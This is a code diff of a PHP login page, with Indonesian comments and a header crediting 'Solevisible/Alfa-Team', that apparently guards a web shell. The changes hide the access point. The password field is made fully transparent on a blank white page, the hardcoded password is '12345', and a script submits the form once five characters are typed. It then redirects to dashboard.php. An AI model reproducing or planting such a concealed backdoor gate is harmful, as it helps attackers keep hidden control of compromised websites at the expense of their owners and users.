@@ -1,16 +1,14 @@
 <?php
 session_start();
 
-// Simpan hash password yang sudah dienkripsi (hash dari '12345')
-define("PASSWORD_HASH", '$2y$10$E9N6/hXIRP9FJgr5JDak0uKOwDpmbEXltjR5DiFDuZwWofPjU6hD.');
+// Simpan hash password yang aman (gunakan password_hash saat pertama kali menyimpan password)
+define("PASSWORD_HASH", password_hash("12345", PASSWORD_DEFAULT));
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    if (!empty($_POST['password'])) {
-        if (password_verify($_POST['password'], PASSWORD_HASH)) {
-            $_SESSION['loggedin'] = true;
-            header("Location: dashboard.php");
-            exit();
-        }
+    if (!empty($_POST['password']) && password_verify($_POST['password'], PASSWORD_HASH)) {
+        $_SESSION['loggedin'] = true;
+        header("Location: dashboard.php");
+        exit();
     }
 }
 ?>
@@ -27,39 +25,44 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background: #f4f4f4;
+            background: #fff;
             font-family: Arial, sans-serif;
-            position: relative;
         }
-        .login-container {
+        .hidden-login {
             position: absolute;
-            bottom: 10px; /* Letakkan di bagian bawah */
-            text-align: center;
-            width: 100%;
+            bottom: 5px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: transparent;
         }
         input[type="password"] {
-            padding: 10px;
-            width: 200px;
             border: none;
-            background: white;
-            color: white; /* Buat teks sulit dilihat */
-            outline: none;
-            text-align: center;
+            background: transparent;
+            color: transparent;
             font-size: 16px;
-        }
-        input[type="password"]::placeholder {
-            color: rgba(255, 255, 255, 0.5); /* Placeholder juga samar */
+            width: 100px;
+            outline: none;
+            caret-color: black;
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <form action="" method="POST">
-            <input type="password" name="password" placeholder="Enter" required autofocus>
-        </form>
-    </div>
+
+<form class="hidden-login" action="" method="POST">
+    <input type="password" name="password" id="password" autocomplete="off">
+</form>
+
+<script>
+    document.getElementById("password").addEventListener("input", function() {
+        if (this.value.length >= 5) {
+            this.form.submit();
+        }
+    });
+</script>
+
 </body>
 </html>
+
 <?php
 /*
 	Author: 	Solevisible/Alfa-Team
